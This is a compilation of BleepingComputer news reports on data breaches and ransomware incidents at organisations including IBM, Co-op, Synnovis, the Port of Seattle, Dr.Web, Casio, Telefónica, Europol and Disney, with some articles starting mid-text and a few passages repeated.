The compromised data could support highly effective phishing, scamming, and social engineering attacks, and considering the value of medical data, there is a high chance they will be sold for a premium on darknet markets. IBM has published a separate announcement about the incident that says there are no indications the stolen data has been misused. Still, IBM urges Janssen CarePath users to remain vigilant and closely monitor their account statements for suspicious activity. Also, the tech giant is now offering a one-year credit monitoring free of charge to all impacted individuals to help protect them from fraud. Both announcements share toll-free numbers where providers and users may call to address their questions about the incident or get help enrolling in credit monitoring services. IBM is also among the hundreds of entities breached by Clop ransomware earlier this year when the notorious threat actors exploited a zero-day vulnerability on the MOVEit Transfer software used by numerous organizations worldwide. A couple of weeks back, the Colorado Department of Health Care Policy & Financing (HCPF) informed four million individuals that their personal and medical data had been exposed due to the breach on IBM. BleepingComputer has asked IBM about whether this incident is related to the MOVEit attack, and a spokesperson told us that it is a separate incident caused by different threat actors. On the question of how many people have been impacted, IBM told BleepingComputer that they are notifying all CarePath users.

"New ‘IndonesianFoods’ spammer floods npm with 150,000 packages",https://www.bleepingcomputer.com/news/security/new-indonesianfoods-spammer-floods-npm-with-150-000-packages/,Bill Toulas,"November 13, 2025","Article and title updated to remove the term ""worm"". See update below. An auto-spamming payload published on npm spams the registry by spawning new packages every seven seconds, creating large volumes of junk. The replicating payload, dubbed ‘IndonesianFoods,’ due to its distinctive package naming scheme that picks random Indonesian names and food terms, has published over 100,000 packages according to Sonatype, and the number is growing exponentially. Although the packages do not have a malicious component for developers (e.g., stealing data, backdooring hosts), this could change with an update that introduces a dangerous payload. The level of automation and large-scale nature of the attack create the potential for broad supply-chain compromise. Security researcher Paul McCarty, who first reported this spam campaign, created a page to track the offending npm publishers and the number of packages they have released on the platform. Sonatype reports that the same actors performed another attempt on September 10, with a package named ‘fajar-donat9-breki.’ Although that package contained the same replication logic, it failed to spread. “This attack has overwhelmed multiple security data systems, demonstrating unprecedented scale,” Sonatype’s principal security researcher, Garrett Calpouzos, told BleepingComputer. “Amazon Inspector is flagging these packages through OSV advisories, triggering a massive wave of vulnerability reports. Sonatype’s database alone saw 72,000 new advisories in a single day.” The researcher commented that IndonesianFoods does not appear to focus on infiltrating developer machines, but rather to stress the ecosystem and disrupt the world’s largest software supply chain. “The motivation is unclear, but the implications are striking,” noted Calpouzos. A report from Endor Labs on the IndonesianFoods campaign mentions that some packages appear to abuse the TEA Protocol, a blockchain system that rewards OSS contributions with TEA tokens, containing tea.yaml files listing TEA accounts and wallet addresses. By publishing thousands of interconnected packages, attackers inflated their impact scores to earn more tokens, indicating a financial motive behind the attack. Also, Endor Labs reports that the spam campaign actually began two years ago, with 43,000 packages being added in 2023, TEA monetization being implemented in 2024, and the self-replication loop introduced in 2025. The IndonesianFoods campaign comes in the context of several similar automation-based supply-chain attacks on open-source ecosystems, including the GlassWorm attack on OpenVSX, the Shai-Hulud worm employing dependency confusion propagation, and the hijacks of widely used packages like chalk and debug . Individually, these incidents caused limited damage , but they highlight a new trend in which attackers increasingly exploit automation and scale to overwhelm open-source ecosystems. Sonatype also warned that these simple yet impactful operations create ideal conditions for threat actors to slip in more serious malware into open-source ecosystems. As the attack continues to unfold, software developers are advised to lock down dependency versions, monitor for abnormal publishing patterns, and implement strict digital signature validation policies. Update 11/14 - AWS researchers also published a report with their observations on the same campaign, reporting having identified over 150,000 packages on the npm now. Update 11/15 - Article title and content updated to reflect the fact that the malicious packages spam npm, and according to Socket.dev do not feature autonomous propagation mechanisms and has to be manually launched. Hence, the use of the term 'worm' was technically inaccurate, and has been removed. It's budget season!

Co-op (short for the Co-operative Group) is one of the United Kingdom's largest consumer co-operatives, operating food stores, funeral services, insurance, and legal services. It is owned by millions of members who receive discounts on services and share in the company's governance. Co-op's CEO, Shirine Khoury-Haq, apologized today on the BBC Breakfast show, confirming that the attackers successfully stole the data for all of its 6.5 million members. ""Their data was copied, and the criminals did have access to it like they do when they hack other organizations. That is the awful part of this unfortunately,"" said Khoury-Haq. While no financial or transaction information was exposed in the attack, the contact information for its members was stolen. The CEO said the breach felt like a personal attack, not on her, but rather on the Co-op's members and employees who were impacted. ""And it it's not about me. It was my colleagues. It was personal to me because it hurt them. It hurt my members. They took their data and it hurt our customers and that I do take personally,"" she explained in the interview. The cyberattack occurred in April , forcing Co-op to shut down several IT systems to prevent the threat actors from further spreading to devices and ultimately deploying the DragonForce ransomware encryptor. Initially downplayed as an attempted intrusion into its network, the company later confirmed that a ""significant"" amount of data was accessed and stolen during the attack. Sources told BleepingComputer at the time that the breach initially occurred on April 22, after the threat actors conducted a social engineering attack that allowed them to reset an employee's password. Once they gained access to the network, they spread to other devices and ultimately stole the Windows domain's Windows NTDS.dit file. This file is a database for Windows Active Directory Services that contains password hashes for Windows accounts. Threat actors commonly steal this file to extract and crack passwords offline, allowing them to further spread to other devices on the network. BleepingComputer was told that the attack was linked to threat actors associated with Scattered Spider, who were linked to the Marks & Spencer (M&S) cyberattack where the DragonForce ransomware was deployed. The BBC reported that they spoke to the DragonForce ransomware operator about Co-op, who confirmed one of its affiliates was behind the attack. They also shared samples of data with the BBC, claiming that Co-op's corporate and customer data had been stolen during the attack. Last week, the UK's National Crime Agency (NCA) arrested four people suspected of being involved in the attacks on Co-op, M&S, and an attempted one on Harrods . The arrested individuals are two 19-year-old males, one 17-year-old male, and a 20-year-old female, who were apprehended in London and the West Midlands. It is reported that one of the suspects arrested is linked to a 2023 attack on MGM Resorts that resulted in the encryption of over 100 VMware ESXi virtual machines .

Founded in 2021, Synnovis is a partnership between international medical diagnostics provider SYNLAB, Guy's and St Thomas' NHS Foundation Trust, and King's College Hospital NHS Foundation Trust. It provides pathology services to UK healthcare organisations, including the National Health Service (NHS). Synnovis is now reaching out to affected organizations, including NHS hospitals and clinics, but will not contact patients directly. Patient notifications will be handled by the impacted NHS organizations, as required by UK data protection law. ""We have now begun notifying the organisations whose data was affected and expect to conclude this process by 21 November 2025. This marks the latest stage of investigation that has taken a large team of forensic experts and data specialists over a year to complete,"" Synnovis said in a Monday press release. ""The stolen data was unstructured, incomplete and fragmented, requiring the use of highly specialised platforms and bespoke processes to piece it together – factors which heavily influenced the duration of the investigation."" The stolen data includes personal information, such as the affected patients' NHS numbers, names, dates of birth, and, in some cases, test results that could be matched to an individual. However, Synnovis says the majority of the stolen information requires ""clinical knowledge or further enrichment to interpret."" On June 3, 2024, Synnovis was hit by a ransomware attack with ""major impact"" on procedures and operations at multiple major NHS hospitals in London, including King's College Hospital, Guy's Hospital, St Thomas' Hospital, Royal Brompton Hospital, and Evelina London Children's Hospital. Non-emergency pathology appointments and blood transfusions at the impacted London hospitals have been either canceled, postponed, or redirected to other providers. The incident also led to blood shortages in London and forced affected hospitals to cancel over ""800 planned operations and 700 outpatient appointments."" On June 20, 2024, the attackers released data allegedly stolen from Synnovis' system, prompting the company to notify the Information Commissioner's Office and secure a legal injunction against further use. While Synnovis has yet to name the threat group behind last year's ransomware attack, the incident was linked to the Qilin ransomware operation by Ciaran Martin, the founder and first CEO of the National Cyber Security Centre (NCSC). On a dedicated site, the company confirmed that it didn't pay a ransom following the incident, following a joint decision with its NHS Trust partners that ""reflects our commitment to ethical principles and the rejection of funding future cybercriminal activities that threaten critical infrastructure, patient privacy, and national security.""

""23andMe believes the settlement is fair, adequate, and reasonable,"" the company said in a memorandum filed Friday . 23andMe has also agreed to strengthen its security protocols, including protections against credential-stuffing attacks, mandatory two-factor authentication for all users, and annual cybersecurity audits.

The agency disclosed the attack on August 24 , saying the resulting IT outage disrupted multiple services and systems, including reservation check-in systems, passenger display boards, the Port of Seattle website, the flySEA app, and delayed flights at Seattle-Tacoma International Airport. Three weeks after the initial disclosure, the Port confirmed that the Rhysida ransomware operation was behind the August 2024 breach. After the incident, the Port also decided not to give in to the cybercriminals' demands to pay for a decryptor even though they threatened to publish stolen data on their dark web leak site. ""We have refused to pay the ransom demanded, and as a result, the actor may respond by posting data they claim to have stolen on their darkweb site,"" the Port of Seattle said on September 13, 2024. ""Our investigation of what data the actor took is ongoing, but it does appear that some Port data was obtained by the actor in mid-to-late August. Assessment of the data taken is complex and takes time."" On Thursday, April 3, 2025, the Port announced that it's now sending approximately 90,000 notification letters to individuals impacted by the resulting data breach who had a mailing address. According to the agency, roughly 71,000 of those affected by this data breach are from Washington state. According to a copy of the breach notification letters , the attackers stole employee, contractor, and parking data in various combinations, including names, dates of birth, Social Security numbers (or last four digits of Social Security number), driver's license or other government identification card numbers, and some medical information. The Port also said that it stores ""very little information"" on airport or maritime passengers and that its payment processing systems were unaffected by the attack. ""At no point did this incident affect the ability to safely travel to or from SEA Airport or use the Port's maritime facilities,"" the Port added this week . ""The proprietary systems of major airline and cruise partners were not affected, nor were the systems of federal partners like the Federal Aviation Administration, Transportation Security Administration, and U.S. Customs and Border Protection."" Rhysida, the ransomware-as-a-service (RaaS) operation behind the Port of Seattle attack, surfaced in May 2023 and quickly gained notoriety after breaching the British Library , the Chilean Army (Ejército de Chile) , the City of Columbus, Ohio , Sony subsidiary Insomniac Games , and MarineMax (the world's largest recreational boat and yacht retailer).

The impacted organization, not named in a statement published today, is a service supplier for GMP and other organizations across the UK. GMP does not believe the data on the hacked systems contains financial information belonging to the police department's employees. ""We are aware of a ransomware attack affecting a third-party supplier of various UK organisations, including GMP, which holds some information on those employed by GMP,"" Assistant Chief Constable Colin McFarlane said . ""At this stage, it's not believed this data includes financial information."" However, McFarlane didn't provide details on what other types of information might have been compromised in the breach. ""We understand how concerning this is for our employees so, as we work to understand any impact on GMP, we have contacted the Information Commissioners Office and are doing everything we can to ensure employees are kept informed, their questions are answered, and they feel supported,"" McFarlane said. He also emphasized that the police department treats the ransomware attack and the resulting data breach with the utmost priority as part of a national-level criminal investigation. The attack on GMP comes roughly a month after the Police Service of Northern Ireland (PSNI) announced another third-party breach, exposing the personally identifiable information (PII), ranks, and location of 10,000 police officers. Parts of the stolen data were posted online , exposing the identities of undercover officers and endangering the health and safety of staff due to their crime-fighting role.

Dr.Web confirmed last month that its network was breached on September 14, which forced it to disconnect all internal servers and stop pushing virus database updates to customers while investigating the incident. In a Tuesday Telegram post, DumpForums pro-Ukrainian hacktivists said they were behind the hack and gained access to Dr.Web's development systems. They allegedly had access to Dr.Web's network for roughly one month, which allowed them to steal around ten terabytes of data, including client databases, from the company's GitLab, email, Confluence, and other compromised servers. ""We managed to hack into and offload the corporate GitLab server where internal development and projects were stored, the corporate mail server, Confluence, Redmine, Jenkins, Mantis, RocketChat - systems where development was conducted and tasks were discussed,"" DumpForums said. ReliaQuest's Threat Research Team says that DumpForums has been an online ""hub for hacktivists and patriotic cyber threat actors"" since at least late May 2022. Their efforts are focused on supporting ""the Ukrainian war effort against Russia"" through DDoS attacks and leaking information stolen from the Russian government and private entities. Today, Dr.Web published a statement in response to their claims, confirming again the September breach but saying that the attack was ""promptly stopped."" The Russian anti-malware company added that it won't pay a ransom demand, which the attackers had since requested, and denied that customer information was stolen in the attack. ""The main goal was to demand a ransom from our company, but we are not negotiating with the attackers. At the moment, law enforcement agencies are conducting an investigation, and therefore we cannot give detailed comments so as not to interfere with the investigation,"" Dr.Web said in a Wednesday Telegram post. ""The information published in Telegram is mostly untrue, user data was not affected. Neither virus database updates nor software module updates pose any security threat to our users."" Dr.Web has yet to reply to multiple emails sent by BleepingComputer to request more information regarding the breach and DumpForums' claims. Dr.Web is the most recent Russian cybersecurity company that was targeted and breached in a cyberattack. In June , pro-Ukrainian hackers Cyber Anarchy Squad breached the Russian information security firm Avanpost, claiming to have leaked 390GB of stolen data before encrypting over 400 virtual machines. One year earlier, in June 2023, Kaspersky also disclosed that attackers infected iPhones on its network with spyware via iMessage zero-click exploits, which targeted iOS zero-day bugs as part of a campaign now known as "" Operation Triangulation .""

Their efforts are focused on supporting ""the Ukrainian war effort against Russia"" through DDoS attacks and leaking information stolen from the Russian government and private entities. Today, Dr.Web published a statement in response to their claims, confirming again the September breach but saying that the attack was ""promptly stopped."" The Russian anti-malware company added that it won't pay a ransom demand, which the attackers had since requested, and denied that customer information was stolen in the attack. ""The main goal was to demand a ransom from our company, but we are not negotiating with the attackers. At the moment, law enforcement agencies are conducting an investigation, and therefore we cannot give detailed comments so as not to interfere with the investigation,"" Dr.Web said in a Wednesday Telegram post. ""The information published in Telegram is mostly untrue, user data was not affected. Neither virus database updates nor software module updates pose any security threat to our users."" Dr.Web has yet to reply to multiple emails sent by BleepingComputer to request more information regarding the breach and DumpForums' claims. Dr.Web is the most recent Russian cybersecurity company that was targeted and breached in a cyberattack. In June , pro-Ukrainian hackers Cyber Anarchy Squad breached the Russian information security firm Avanpost, claiming to have leaked 390GB of stolen data before encrypting over 400 virtual machines. One year earlier, in June 2023, Kaspersky also disclosed that attackers infected iPhones on its network with spyware via iMessage zero-click exploits, which targeted iOS zero-day bugs as part of a campaign now known as "" Operation Triangulation .""

The threat actor compromised the company network about a week before the discovery of the intrusion. Immediately after discovering the unauthorized access, the company took action to prevent the hackers from reaching further into the system. “Our information security team discovered that a hacker using a Hong Kong-based IP address targeted and accessed a Maxar system containing certain files with employee personal data,” reads the data breach notification . “When we discovered this on October 11, 2024, we took immediate action to protect further unauthorized access to the system. Nevertheless, according to our investigation, the hacker likely had access to the files on the system for approximately one week before this action was taken,” the company informs. Maxar Space Systems is a major player in the American aerospace industry, considered an expert in building communicatin and Earth observation satellites. The Colorado-based company has built more than 80 satelliets that are currently on orbit, and its technology has contributed to space exploration. The Maxar 1300 platform played a key part for the success of NASA’s Psyche mission and its power and propulsion elements were used for the Artemis Moon exploration program. Maxar Space Systems says that the attacker likely has access to a system that contained the following employee information: The company clarified that no bank account information was exposed in the cybersecurity incident. Current employees impacted by the incident are offered IDShield indentity protection and credit monitoring services, while former employees have until mid-February 2025 to enroll in identity theft protection services from IDX. Although the data breach disclosure notifies of personal data for employees being exposed, in some cases such compromises also impact proprietary technical data. On a related note, a threat actor claimed in July to have scraped the user base of GeoHIVE, a geospatial intelligence platform by Maxar Technologies, the parent company of Maxar Space Systems.

"Underground ransomware claims attack on Casio, leaks stolen data",https://www.bleepingcomputer.com/news/security/underground-ransomware-claims-attack-on-casio-leaks-stolen-data/#comment_form,Bill Toulas,"October 10, 2024","The Underground ransomware gang has claimed responsibility for an October 5 attack on Japanese tech giant Casio, which caused system disruptions and impacted some of the firm's services. Earlier this week, Casio disclosed the attack on its website but withheld details about the incident, saying it had engaged external IT specialists to investigate whether personal data or other confidential information was stolen in the attack. Today, the Underground ransomware group has added Casio on its dark web extortion portal, leaking troves of data allegedly stolen from the Japanese firm. The leaked data includes: If the above is true, the attack has compromised Casio's workforce and intellectual property, which could negatively impact its business. BleepingComputer has contacted Casio again requesting a comment on the threat actors' claims and data leak, but we have not received a response by publication. Therefore, the threat actor's claims remain unverified. According to a Fortinet report from late August 2024, Underground is a relatively small-scale ransomware operation targeting Windows systems since July 2023. The strain has been associated with the Russian cybercrime group ' RomCom ' (Storm-0978), who previously delivered Cuba ransomware on breached systems. Fortinet reports that during the summer, Underground ransomware operators engaged in exploiting CVE-2023-36884, a remote code execution flaw in Microsoft Office, likely used as an infection vector. Once a system is breached, the attackers modify the registry to keep Remote Desktop sessions alive for 14 days after user disconnection, giving them a comfortable window to maintain access to the system. Underground does not append any file extensions to encrypted files, and it's configured to skip file types essential for Windows operation to avoid rendering the system unusable. Moreover, it stops the MS SQL Server service to free up data for theft and encryption, maximizing the attack's impact. As is the case with most Windows ransomware, Underground deletes shadow copies to make easy data restoration impossible. An unusual trait in Underground's extortion tactics is that it also leaks the stolen data on Mega, promoting links to archives hosted there via its Telegram channel, maximizing the exposure and availability of the data. Underground ransomware's extortion portal currently lists 17 victims, most of whom are based in the USA. Whether or not the Casio attack will be the threat group's breakthrough into the mainstream, followed by a higher attack volume/pace, remains to be seen.

Telefónica is a Spanish multinational telecommunications company operating in twelve countries with over 104,000 employees. The company is the largest telecommunications firm in Spain, operating under the name Movistar. In an email to BleepingComputer today, Telefónica confirmed its ticketing system was breached and are investigating the incident. ""We have become aware of an unauthorized access to an internal ticketing system which we use at Telefónica,"" Telefónica told BleepingComputer ""We are currently investigating the extent of the incident and have taken the necessary steps to block any unauthorized access to the system."" This confirmation comes after a Telefónica Jira database was leaked on a hacking forum, with the breach claimed by four people using the aliases, DNA, Grep, Pryx, and Rey. One of the attackers, Pryx, told BleepingComputer that the ""internal ticketing system"" is an internal Jira development and ticketing server, used by the company to report and resolve internal issues. BleepingComputer was told that the system was breached yesterday using compromised employee credentials, with Telefónica blocking their access today after performing password resets on impacted accounts. Using the compromised employee accounts, the threat actors say they were able to scrape approximately 2.3 GB of documents, tickets, and various data. While some of this data was labeled as customers, BleepingComputer was told the tickets were opened with @telefonica.com email addresses, so may have been tickets opened on behalf of customers. Pryx says they did not contact the company or attempt to extort them before leaking the data online. Three people behind this attack, Grep, Pryx, and Rey, are also members of a recently launched ransomware operation known as Hellcat Ransomware. Hellcat is responsible for a recent breach of Schneider Electric , where 40GB of data was stolen from the company's JIRA server.

One of the attackers, Pryx, told BleepingComputer that the ""internal ticketing system"" is an internal Jira development and ticketing server, used by the company to report and resolve internal issues. BleepingComputer was told that the system was breached yesterday using compromised employee credentials, with Telefónica blocking their access today after performing password resets on impacted accounts. Using the compromised employee accounts, the threat actors say they were able to scrape approximately 2.3 GB of documents, tickets, and various data. While some of this data was labeled as customers, BleepingComputer was told the tickets were opened with @telefonica.com email addresses, so may have been tickets opened on behalf of customers. Pryx says they did not contact the company or attempt to extort them before leaking the data online. Three people behind this attack, Grep, Pryx, and Rey, are also members of a recently launched ransomware operation known as Hellcat Ransomware. Hellcat is responsible for a recent breach of Schneider Electric , where 40GB of data was stolen from the company's JIRA server.

Cooler Master confirms customer info stolen in data breach,https://www.bleepingcomputer.com/news/security/cooler-master-confirms-customer-info-stolen-in-data-breach/#comment_form,Lawrence Abrams,"May 30, 2024","Computer hardware manufacturer Cooler Master has confirmed that it suffered a data breach on May 19, allowing a threat actor to steal customer data. Cooler Master is a popular computer hardware manufacturer known for their cooling devices, computer cases, power supplies, and other peripherals. BleepingComputer reported yesterday that a threat actor known as 'Ghostr' told us they hacked the company's Fanzone website on May 18 and downloaded its linked databases. Cooler Master's Fanzone site is used to register a product's warranty, request an RMA, or open support tickets, requiring customers to fill in personal data, such as names, email addresses, addresses, phone numbers, birth dates, and physical addresses. Ghostr said they were able to download 103 GB of data during the Fanzone breach, including the customer information of over 500,000 customers. The threat actor also shared data samples, allowing BleepingComputer to confirm with numerous customers listed in the breach that their data was accurate and that they recently requested support or an RMA from Cooler Master. Other data in the samples included product information, employee information, and information regarding emails with vendors. The threat actor claimed to have partial credit card information, but BleepingComputer could not find this data in the data samples. After contacting Cooler Master on Tuesday, the company has confirmed to BleepingComputer that they suffered a data breach and are in the process of notifying customers. ""We can confirm on May 19, Cooler Master experienced a data breach involving unauthorized access to customer data. We immediately alerted the authorities, who are actively investigating the breach. Additionally, we have engaged top security experts to address the breach and implement new measures to prevent future incidents. These experts have successfully secured our systems and enhanced our overall security protocols. We are in the process of notifying affected customers directly and advising them on next steps. We are committed to providing timely updates and support to our customers throughout this process."" The threat actor now says they will sell the leaked data on hacking forums but has not disclosed the price. While only a limited amount of data has been shared by the threat actor, if there is indeed information about 500,000 Cooler Master customers, then there is a good chance it will be sold to another threat actor. Therefore, all Cooler Master customers who have registered an account on the company's Fanzone site should be on the lookout for targeted phishing emails and other social engineer attacks designed to steal further personal information.

The Japanese firm is a mobile games and content creator, encompassing Ateam Entertainment, which has multiple games on Google Play like War of Legions , Dark Summoner , Hatsune Miku – Tap Wonder , and tools like Memory Clear | Game Boost Master , and Good Night's Sleep Alarm . Earlier this month, Ateam informed users of its apps and services, employees, and business partners that on November 21, 2023, it discovered that it had incorrectly set a Google Drive cloud storage instance to ""Anyone on the internet with the link can view"" since March 2017. The insecurely configured Google Drive instance contained 1,369 files with personal information on Ateam customers, Ateam business partners, former and current employees, and even interns and people who applied for a position at the company. Ateam has confirmed that 935,779 individuals had their data exposed, with 98.9% being customers. For Ateam Entertainment specifically, 735,710 people have been exposed. The data exposed by this misconfiguration varies depending on the type of relationship each individual had with the company and may include the following: The company says it has seen no concrete evidence of threat actors having stolen the exposed information but urges people to remain vigilant for unsolicited and suspicious communications. Setting Google Drive to ""Anyone with the link can view"" makes it viewable only to those with the exact URL, typically reserved for collaboration between people working with non-sensitive data. If an employee, or someone else with the link, mistakenly exposed it publicly, it could get indexed by search engines and become broadly accessible. While it's unlikely that anyone found an exposed Google Drive URL on their own, this notification demonstrates a need for companies to properly secure their cloud services to prevent data from being mistakenly exposed. It is very common for threat actors and researchers to find exposed cloud services, such as databases and storage buckets, and download the data contained in them. While researchers usually responsibly disclose the exposed data, if threat actors find it, it can lead to bigger problems as they use it to extort companies or sell it to other hackers to use in their own attacks. In 2017, security researcher Chris Vickery found misconfigured Amazon S3 buckets exposing databases containing 1.8 billion social and forum posts made by users worldwide. Ten days later, the same researcher discovered another misconfigured S3 bucket that exposed what appeared to be classified information from INSCOM . While those breaches were responsibly disclosed, other cloud service misconfigurations have led to the data being leaked or sold on hacker forums . Misconfigured Amazon S3 buckets have become a big enough problem that researchers have released tools that scan for exposed buckets . The U.S. Cybersecurity and Infrastructure Security Agency (CISA) has also released guidance for companies on how to properly secure cloud services.

On March 11, 2025, the organization first reported that it was dealing with a cybersecurity incident that occurred three days earlier. This incident caused IT system disruptions but did not impact patient care. Yale New Haven Health hired Mandiant to help with system restoration and forensic investigation while federal authorities were notified about the incident.

The government noted that it activated the security procedures for these situations, stating that the incident has been contained and didn't impact core systems that are vital to its operations. ""The Ministry of Economy and Finance informs the public that today an incident involving possible malicious software was detected on one of the Ministry's workstations,"" MEF says in an official statement . ""The established security protocols were immediately activated, and preventive measures across the entire IT system were reinforced to contain the intrusion."" ""It is important to emphasize that none of MEF's central systems or platforms have been compromised and they continue operating normally."" Panama's MEF is an important ministry in the country, managing fiscal policy, public spending, and debt management. Most importantly, it handles the Panama Canal revenues, the country's largest source of income. The MEF says that personal and institutional data are safe, and all industry-standard measures are in place to prevent future incidents. Hoewever, the INC Ransom gang has claimed an attack on MEF last week in a post on its data leak site. The hackers say that they stole more than 1.5 TB of data from MEF's systems, including emails, financial documents, budgeting details, and more. The threat group added MEF to its list of victims on the dark web on September 5, and leaked data samples in the form of internal documents as proof of the breach. BleepingComputer contacted MEF to ask about the validity of INC Ransom's claims, but we have not received a response by publication time. INC Ransom emerged in mid-2023 as a ransomware-as-a-service (RaaS). They targeted multiple high-profile victims such as Yamaha Motor , Xerox Business Solution , Scotland's NHS , McLaren Health Care , the Texas State Bar , and Ahold Delhaize . In May 2024, a threat actor using the moniker ""salfetka"" posted on the Russian-speaking hacking forums that they had the source code for the ransomware and offered to sell it for $300,000.

Panama Ministry of Economy discloses breach claimed by INC ransomware,https://www.bleepingcomputer.com/news/security/panama-ministry-of-economy-discloses-breach-claimed-by-inc-ransomware/,Bill Toulas,"September 11, 2025","Panama's Ministry of Economy and Finance (MEF) has disclosed that one of its computers may have been compromised in a cyberattack.. The government noted that it activated the security procedures for these situations, stating that the incident has been contained and didn't impact core systems that are vital to its operations. ""The Ministry of Economy and Finance informs the public that today an incident involving possible malicious software was detected on one of the Ministry's workstations,"" MEF says in an official statement . ""The established security protocols were immediately activated, and preventive measures across the entire IT system were reinforced to contain the intrusion."" ""It is important to emphasize that none of MEF's central systems or platforms have been compromised and they continue operating normally."" Panama's MEF is an important ministry in the country, managing fiscal policy, public spending, and debt management. Most importantly, it handles the Panama Canal revenues, the country's largest source of income. The MEF says that personal and institutional data are safe, and all industry-standard measures are in place to prevent future incidents. Hoewever, the INC Ransom gang has claimed an attack on MEF last week in a post on its data leak site. The hackers say that they stole more than 1.5 TB of data from MEF's systems, including emails, financial documents, budgeting details, and more. The threat group added MEF to its list of victims on the dark web on September 5, and leaked data samples in the form of internal documents as proof of the breach. BleepingComputer contacted MEF to ask about the validity of INC Ransom's claims, but we have not received a response by publication time. INC Ransom emerged in mid-2023 as a ransomware-as-a-service (RaaS). They targeted multiple high-profile victims such as Yamaha Motor , Xerox Business Solution , Scotland's NHS , McLaren Health Care , the Texas State Bar , and Ahold Delhaize . In May 2024, a threat actor using the moniker ""salfetka"" posted on the Russian-speaking hacking forums that they had the source code for the ransomware and offered to sell it for $300,000.

Pharmaceutical giant Cencora says data was stolen in a cyberattack,https://www.bleepingcomputer.com/news/security/pharmaceutical-giant-cencora-says-data-was-stolen-in-a-cyberattack/,Lawrence Abrams,"February 27, 2024","Pharmaceutical giant Cencora says they suffered a cyberattack where threat actors stole data from corporate IT systems. Cencora, previously known as AmerisourceBergen, specializes in pharmaceutical services, providing drug distribution and solutions for doctor's offices, pharmacies, and animal healthcare. The Company had $262.2 billion in revenue for fiscal year 2023 and employs approximately 46,000 people. In a Form 8-K filing with the SEC, Cencora disclosed they suffered a cyberattack that led to data theft. ""On February 21, 2024, Cencora, Inc. (the ""Company""), learned that data from its information systems had been exfiltrated, some of which may contain personal information,"" reads the SEC filing . Cencora says they contained the incident and are now working with law enforcement, external cybersecurity experts, and external counsel to investigate it. Upon initial detection of the unauthorized activity, the company immediately took containment steps and commenced an investigation with the assistance of law enforcement, cybersecurity experts, and external counsel. Cencora says they have not determined if the incident will materially impact their finances or operations. When BleepingComputer contacted Cencora to learn more about the incident, they referred us to the statement in the SEC filing. However, they confirmed that their cyberattack is unrelated to the Optum Change Healthcare ransomware attack that has led to significant outages in pharmaceutical billing. ""We have no reason to believe there is a connection between the incident at Change and the unauthorized activity at Cencora,"" Cencora told BleepingComputer in a statement. At this time, there is no further information on who breached Cencora and no ransomware gangs have taken responsibility.

The threat actor also shared samples of the stolen data, which included full names, addresses, phone numbers, and email addresses.

EPE is an online platform law enforcement experts use to ""share knowledge, best practices and non-personal data on crime."" ""Europol is aware of the incident and is assessing the situation. Initial actions have already been taken. The incident concerns a Europol Platform for Expert (EPE) closed user group,"" Europol told BleepingComputer. ""No operational information is processed on this EPE application. No core systems of Europol are affected and therefore, no operational data from Europol has been compromised."" BleepingComputer also asked when the breach occurred and whether it is true FOUO and classified documents were stolen as claimed by the threat actor, but a response was not immediately available. The hardcopy personnel records of Catherine De Bolle, Europol's executive director, and other senior agency officials had also leaked before September 2023, as reported by Politico in March. ""On Sep. 6, 2023, the Europol Directorate was informed that personal paper files of several Europol staff members had disappeared,"" a note dated September 18 and shared on an internal message board system said. ""Given Europol's role as law enforcement authority, the disappearance of personal files of staff members constitutes a serious security and personal data breach incident."" At publication time, the EPE website was offline, and a message said the service was unavailable because it was under maintenance. ​IntelBroker, the threat actor behind the data breach claims, describes the files as being FOUO and containing classified data. The threat actor says the allegedly stolen data includes information on alliance employees, FOUO source code, PDFs, and documents for recon and guidelines. They also claim to have gained access to EC3 SPACE (Secure Platform for Accredited Cybercrime Experts), one of the communities on the EPE portal, hosting hundreds of cybercrime-related materials and used by over 6,000 authorized cybercrime experts from around the world, including: IntelBroker also says they compromised the SIRIUS platform used by judicial and law enforcement authorities from 47 countries, including EU member states, the United Kingdom, countries with a cooperation agreement with Eurojust, and the European Public Prosecutor's Office (EPPO). SIRIUS is used to access cross-border electronic evidence in the context of criminal investigations and proceedings Besides leaking screenshots of EPE's online user interface, IntelBroker also leaked a small sample of an EC3 SPACE database allegedly containing 9,128 records. The sample contains what looks like the personal information of law enforcement agents and cybercrime experts with access to the EC3 SPACE community. ""PRICING: Send offers. XMR ONLY. Message me on the forums for a point of contact. Proof of funds is required. I am only selling to reputable members,"" the threat actor says in a Friday post on a hacking forum. Since December, this threat actor has been leaking data he allegedly stole from various government agencies, such as ICE and USCIS, the Department of Defense, and the U.S. Army. It is unclear whether these incidents are also connected to the alleged April 2024 Five Eyes data leak , but some of the data dumped in the ICE/USCIS forum post overlaps with the Five Eyes post. IntelBroker became known after breaching DC Health Link , which manages health care plans for U.S. House members, staff, and families. The breach led to a congressional hearing after the personal data of 170,000 affected individuals, including U.S. House of Representatives members and staff, was exposed. Other cybersecurity incidents linked to this threat actor are the breaches of Hewlett Packard Enterprise (HPE) , Home Depot , the Weee! grocery service , and an alleged breach of General Electric Aviation . Earlier this week, IntelBroker also started selling access information to the network of cloud security company Zscaler (i.e., ""logs packed with credentials, SMTP Access, PAuth Pointer Auth Access, SSL Passkeys & SSL Certificates""). Zscaler later confirmed they discovered an ""isolated test environment"" exposed online, which was taken offline for forensic analysis even though no company, customer, or production environments were impacted. Zscaler has also hired an incident response firm to run an independent investigation. Update May 13, 12:09 EDT : In an updated statement to BleepingComputer, Europol says that the portal was not hacked through a vulnerability or a misconfiguration, but, instead, the attackers gained access to the data using stolen credentials. The attempt took place recently and was discovered immediately. Neither Europol's core system nor operational systems were hacked, which means no operational data from Europol has been compromised. The Europol Expert Platform (EPE) was also not hacked. The only way to gain unauthorized access to the system was through email or password compromise.

Disney ditching Slack after massive July data breach,https://www.bleepingcomputer.com/news/security/disney-ditching-slack-after-massive-july-data-breach/#comment_form,Lawrence Abrams,"September 20, 2024","The Walt Disney Company is reportedly ditching Slack after a July data breach exposed over 1TB of confidential messages and files posted to the company's internal communication channels. According to CNBC , Disney has already begun migrating to new ""streamlined enterprise-wide collaboration tools"" and emailed employees this week to say that they will finish the migration at the end of the company's next fiscal quarter. This move comes after the company suffered a massive data breach in July when a threat actor named 'NullBulge' breached Disney's Slack platform and stole 1.1TB of data. The threat actor claimed to steal all messages and files from almost 10,000 Slack channels containing upcoming project details, financial information, information technology information, and other confidential information. Disney suffered another data breach a month earlier when 2.5GB of Club Penguin and corporate data was leaked from the company’s Confluence server on the 4chan message board. It's unclear how employees will communicate after moving away from Slack and whether Disney will be transitioning to another enterprise platform, like Microsoft Teams, or their own internal software. Communication platforms, like Slack, can be a tempting target for threat actors to steal confidential files that can be used to taunt their victims. In 2022, the Lapsus$ hacking group breached Uber's Slack server using an employee's stolen 